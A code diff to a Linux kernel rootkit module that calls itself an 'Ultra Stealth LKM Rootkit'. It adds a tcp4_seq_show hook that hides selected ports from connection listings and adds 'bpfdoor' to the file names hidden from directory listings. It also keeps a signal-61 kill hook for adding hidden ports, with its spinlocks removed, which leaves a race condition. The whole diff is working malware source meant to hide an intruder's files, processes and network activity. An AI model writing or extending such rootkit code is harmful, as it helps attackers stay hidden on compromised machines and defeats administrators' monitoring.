@@ -48,18 +48,7 @@ MODULE_DESCRIPTION("Advanced Ultra Stealth LKM Rootkit");
 #define TARGET_STRING "deception"
 
 static const char *hide_keywords[] = {
-    "deception",
-    "__x64_sys_kill",
-    "__x64_sys_getdents64",
-    "__x64_sys_recvmsg",
-    "__x64_sys_sendmsg",
-    "__x64_sys_sendto",
-    "tcp6_seq_show",
-    "vfs_read",
-    "kallsyms_lookup_name",
-    "do_syslog",
-    "devkmsg_read",
-    "__x64_sys_write"
+    "deception"
 };
 
 struct hidden_pid {
@@ -78,6 +67,7 @@ static asmlinkage long (*orig_sendmsg)(const struct pt_regs *);
 static asmlinkage long (*orig_sendto)(const struct pt_regs *);
 static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
 static asmlinkage long (*orig_kill)(const struct pt_regs *);
+static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
 static asmlinkage long (*orig_tcp6_seq_show)(struct seq_file *, void *);
 static asmlinkage long (*orig_write)(const struct pt_regs *);
 static asmlinkage int fh_do_syslog(int type, char __user *buf, int len, int from_file);
@@ -98,6 +88,8 @@ static DEFINE_SPINLOCK(ports_lock);
 
 static LIST_HEAD(hidden_pids_list);
 static DEFINE_SPINLOCK(pids_lock);
+
+static int port_to_hide = 0;
 
 static bool buf_has_hide_keyword(const char *kbuf, size_t len)
 {
@@ -648,7 +640,8 @@ static asmlinkage int hook_getdents64(const struct pt_regs *regs)
 
         if (!hide && (cur->d_type == DT_DIR || cur->d_type == DT_REG || cur->d_type == DT_UNKNOWN)) {
 
-        if (strncmp(cur->d_name, "secret_", 7) == 0)
+        if (strncmp(cur->d_name, "secret_", 7) == 0 ||
+            strncmp(cur->d_name, "bpfdoor", 7) == 0)
 
                 hide = true;
         }
@@ -709,37 +702,44 @@ static asmlinkage long hook_kill(const struct pt_regs *regs)
         return 0;
     }
 
-    if (sig == 61) {
+        if (sig == 61) {
         u16 target_port = (u16)pid;
-
-        spin_lock(&ports_lock);
         if (target_port == 0) {
             hidden_ports_count = 0;
-            spin_unlock(&ports_lock);
             return 0;
         }
-
         for (i = 0; i < hidden_ports_count; i++) {
             if (hidden_ports[i] == target_port) {
-                int j;
-                for (j = i; j < hidden_ports_count - 1; j++)
+                for (int j = i; j < hidden_ports_count - 1; j++) {
                     hidden_ports[j] = hidden_ports[j + 1];
-
+                }
                 hidden_ports_count--;
-                spin_unlock(&ports_lock);
                 return 0;
             }
         }
-
-        if (hidden_ports_count < MAX_HIDDEN_PORTS)
+        if (hidden_ports_count < MAX_HIDDEN_PORTS) {
             hidden_ports[hidden_ports_count++] = target_port;
-
-        spin_unlock(&ports_lock);
+        }
         return 0;
     }
 
     return orig_kill(regs);
 }
+
+static asmlinkage long hooked_tcp4_seq_show(struct seq_file *seq, void *v) {
+    if (v != SEQ_START_TOKEN && v != NULL && hidden_ports_count > 0) {
+        struct sock *sk = (struct sock *)v;
+        if (sk->sk_state == TCP_TIME_WAIT) {
+            struct inet_timewait_sock *tw = (struct inet_timewait_sock *)v;
+            if (is_port_hidden(ntohs(tw->tw_sport)) || is_port_hidden(ntohs(tw->tw_dport))) return 0;
+        } else {
+            struct inet_sock *inet = inet_sk(sk);
+            if (is_port_hidden(ntohs(inet->inet_sport)) || is_port_hidden(ntohs(inet->inet_dport))) return 0;
+        }
+    }
+    return orig_tcp4_seq_show(seq, v);
+}
+
 
 static int hooked_tcp6_seq_show(struct seq_file *seq, void *v)
 {
@@ -767,6 +767,7 @@ static struct ftrace_hook fh_hooks[] = {
     HOOK("__x64_sys_sendto",     hook_sendto,          &orig_sendto),
     HOOK("__x64_sys_getdents64", hook_getdents64,      &orig_getdents64),
     HOOK("__x64_sys_kill",       hook_kill,            &orig_kill),
+    HOOK("tcp4_seq_show",        hooked_tcp4_seq_show, &orig_tcp4_seq_show),
     HOOK("tcp6_seq_show",        hooked_tcp6_seq_show, &orig_tcp6_seq_show),
     HOOK("do_syslog",            fh_do_syslog,         &orig_do_syslog),
     HOOK("devkmsg_read",         fh_devkmsg_read,      &orig_devkmsg_read),
